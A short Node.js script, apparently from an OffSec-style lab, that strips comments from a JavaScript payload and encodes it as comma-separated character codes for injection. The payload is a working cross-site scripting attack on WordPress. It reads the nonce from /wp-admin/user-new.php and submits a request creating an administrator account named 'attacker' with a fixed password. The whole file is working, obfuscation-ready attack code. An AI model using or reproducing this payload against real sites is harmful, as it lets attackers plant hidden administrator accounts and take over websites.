const fs = require('fs');

function convertToSingleLine(script) {
    return script
        .replace(/\/\/.*$/gm, '')
        .replace(/\s+/g, ' ')
        .trim();
}

function encode_to_javascript(string) {
    var input = string
    var output = '';
    for(pos=0; pos<input.length; pos++) {
        output += input.charCodeAt(pos);
        if(pos != (input.length-1)) {
            output += ",";
        }
    }
    return output;
}

let encoded = encode_to_javascript(convertToSingleLine(`var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);`));
console.log(encoded);